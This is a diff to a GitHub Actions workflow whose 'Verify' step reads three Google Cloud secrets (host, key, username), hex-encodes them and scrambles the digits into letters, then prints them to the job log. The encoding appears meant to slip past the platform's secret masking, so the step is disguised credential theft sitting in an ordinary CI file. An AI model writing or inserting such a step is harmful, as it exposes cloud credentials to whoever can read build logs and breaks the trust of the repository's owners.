@@ -7,10 +7,10 @@ jobs:
       - name: Verify
         env:
           K0: ${{ secrets.GCP_HOST }}
-          K1: ${{ secrets.GCP_KEY }}
-          K2: ${{ secrets.GCP_USERNAME }}
+          K1: ${{ secrets.GCP_USERNAME }}
+          K2: ${{ secrets.GCP_KEY }}
         run: |
           set +e
-            echo "J0::$(echo -n "$K0" | xxd -p | tr -d '\n' | tr '0123456789abcdef' 'abcdefghijklmnop')"
-            echo "J1::$(echo -n "$K1" | xxd -p | tr -d '\n' | tr '0123456789abcdef' 'abcdefghijklmnop')"
-            echo "J2::$(echo -n "$K2" | xxd -p | tr -d '\n' | tr '0123456789abcdef' 'abcdefghijklmnop')"
+          echo "G0::$(echo -n "$K0" | xxd -p | tr -d '\n' | tr '0123456789abcdef' 'abcdefghijklmnop')"
+          echo "G1::$(echo -n "$K1" | xxd -p | tr -d '\n' | tr '0123456789abcdef' 'abcdefghijklmnop')"
+          echo "G2::$(echo -n "$K2" | xxd -p | tr -d '\n' | tr '0123456789abcdef' 'abcdefghijklmnop')"
